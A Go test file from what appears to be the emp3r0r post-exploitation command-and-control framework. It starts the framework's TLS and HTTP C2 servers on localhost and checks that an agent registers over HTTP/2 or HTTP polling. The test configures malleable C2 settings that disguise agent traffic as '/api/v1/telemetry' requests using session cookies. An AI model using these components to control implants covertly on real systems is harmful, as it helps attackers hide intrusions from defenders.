package c2transport_test

import (
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"sync"
	"testing"
	"time"

	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/agentutils"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/network"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/server"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
)

func waitForPort(addr string, deadline time.Time) error {
	ticker := time.NewTicker(100 * time.Millisecond)
	defer ticker.Stop()
	for {
		if time.Now().After(deadline) {
			return fmt.Errorf("timeout waiting for %s to accept connections", addr)
		}
		conn, err := net.DialTimeout("tcp", addr, 200*time.Millisecond)
		if err == nil {
			conn.Close()
			return nil
		}
		<-ticker.C
	}
}

func runCheckinACK(t *testing.T, mode string) {
	t.Helper()

	tmpDir, err := os.MkdirTemp("", "agent_http_poll_test")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tmpDir)
	defer network.StopEmpTLSServer()
	defer server.MarkOperatorOffline("test-operator")

	caCertFile := filepath.Join(tmpDir, "ca-cert.pem")
	caKeyFile := filepath.Join(tmpDir, "ca-key.pem")
	serverCertFile := filepath.Join(tmpDir, "server-cert.pem")
	serverKeyFile := filepath.Join(tmpDir, "server-key.pem")

	if _, err = transport.GenCerts(nil, caCertFile, caKeyFile, "", "", true); err != nil {
		t.Fatalf("Failed to generate CA: %v", err)
	}
	if _, err = transport.GenCerts([]string{"127.0.0.1"}, serverCertFile, serverKeyFile, caKeyFile, caCertFile, false); err != nil {
		t.Fatalf("Failed to generate server cert: %v", err)
	}

	caCertData, err := os.ReadFile(caCertFile)
	if err != nil {
		t.Fatalf("Failed to read CA cert: %v", err)
	}
	transport.CACrtPEM = caCertData
	transport.CaCrtFile = caCertFile
	transport.CaKeyFile = caKeyFile
	transport.OperatorCaCrtFile = caCertFile
	transport.ServerCrtFile = serverCertFile
	transport.ServerKeyFile = serverKeyFile
	transport.EmpWorkSpace = tmpDir
	live.EmpWorkSpace = tmpDir

	tlsListener, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("Failed to reserve TLS port: %v", err)
	}
	tlsPort := tlsListener.Addr().(*net.TCPAddr).Port
	tlsListener.Close()

	httpListener, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("Failed to reserve HTTP port: %v", err)
	}
	httpPort := httpListener.Addr().(*net.TCPAddr).Port
	httpListener.Close()

	live.RuntimeConfig = &def.Config{
		CCH2Port:      fmt.Sprintf("%d", tlsPort),
		CCHTTPPort:    fmt.Sprintf("%d", httpPort),
		CAPEM:         string(caCertData),
		C2ChannelMode: mode,
		C2Routes: def.C2Routing{
			Checkin: "c2-checkin",
			Msg:     "c2-msg",
			FTP:     "c2-ftp",
			WWW:     "c2-www",
			Proxy:   "c2-proxy",
		},
		MalleableC2: def.MalleableHTTPConfig{
			C2Path:        "/api/v1/telemetry",
			SessionHeader: "Cookie",
			SessionValue:  "sessionID=%s",
			InitHeader:    "Cookie",
			InitValue:     "init=1",
			CloseHeader:   "Cookie",
			CloseValue:    "close=1",
		},
	}

	live.AgentControlMap = sync.Map{}
	live.AgentList = sync.Map{}

	go server.StartC2AgentTLSServer()
	server.MarkOperatorOnline("test-operator")
	if err := waitForPort(fmt.Sprintf("127.0.0.1:%d", tlsPort), time.Now().Add(10*time.Second)); err != nil {
		t.Fatalf("TLS C2 server did not become ready: %v", err)
	}

	if mode == "http_poll" {
		go server.StartC2HTTPServer()
		if err := waitForPort(fmt.Sprintf("127.0.0.1:%d", httpPort), time.Now().Add(10*time.Second)); err != nil {
			t.Fatalf("Plain HTTP server did not become ready: %v", err)
		}
	}

	agentUUID := uuid.NewString()
	agentPriv, agentPub, err := genAgentKey()
	if err != nil {
		t.Fatalf("Failed to generate agent key: %v", err)
	}
	agentutils.AgentKey = agentPriv

	caKey, err := transport.ParseKeyPemFile(caKeyFile)
	if err != nil {
		t.Fatalf("Failed to parse CA key: %v", err)
	}
	agentSig, err := signUUID(agentUUID, caKey)
	if err != nil {
		t.Fatalf("Failed to sign UUID: %v", err)
	}

	common.RuntimeConfig = &def.Config{
		CCAddress:     "127.0.0.1",
		CCH2Port:      fmt.Sprintf("%d", tlsPort),
		CCHTTPPort:    fmt.Sprintf("%d", httpPort),
		C2ChannelMode: mode,
		CAPEM:         string(caCertData),
		C2Routes:      live.RuntimeConfig.C2Routes,
		AgentUUID:     agentUUID,
		AgentUUIDSig:  agentSig,
		AgentTag:      agentUUID,
		MalleableC2:   live.RuntimeConfig.MalleableC2,
	}

	certPool := x509.NewCertPool()
	if ok := certPool.AppendCertsFromPEM(caCertData); !ok {
		t.Fatalf("Failed to append CA cert")
	}

	if mode == "http_poll" {
		def.CCAddress = fmt.Sprintf("http://127.0.0.1:%d", httpPort)
		def.HTTPClient = transport.CreateEmp3r0rHTTPClient(def.CCAddress, "")
		if def.HTTPClient == nil {
			t.Fatalf("Failed to create plain HTTP client")
		}
		if tr, ok := def.HTTPClient.Transport.(*http.Transport); ok {
			tr.TLSClientConfig = &tls.Config{RootCAs: certPool}
		}
	} else {
		def.CCAddress = fmt.Sprintf("https://127.0.0.1:%d", tlsPort)
		def.HTTPClient = &http.Client{Transport: &http.Transport{
			TLSClientConfig:   &tls.Config{RootCAs: certPool, NextProtos: []string{"h2"}},
			ForceAttemptHTTP2: true,
		}}
	}

	agentInfo := &def.Emp3r0rAgent{
		Tag:       agentUUID,
		UUID:      agentUUID,
		UUIDSig:   agentSig,
		PublicKey: agentPub,
		OS:        "Linux",
		GOOS:      "linux",
		IPs:       []string{"127.0.0.1"},
		Process:   &def.AgentProcess{},
	}

	if err := c2transport.ReportStatus(common.RuntimeConfig, agentInfo); err != nil {
		t.Fatalf("ReportStatus failed for mode %s: %v", mode, err)
	}

	deadline := time.Now().Add(5 * time.Second)
	for {
		if agents.GetAgentByUUID(agentUUID) != nil {
			break
		}
		if time.Now().After(deadline) {
			t.Fatalf("Agent was not registered after %s check-in", mode)
		}
		time.Sleep(100 * time.Millisecond)
	}
}

func TestPlainHTTPCheckinACK(t *testing.T) {
	for _, mode := range []string{def.C2ChannelModeH2Conn, "http_poll"} {
		mode := mode
		t.Run(mode, func(t *testing.T) {
			runCheckinACK(t, mode)
		})
	}
}
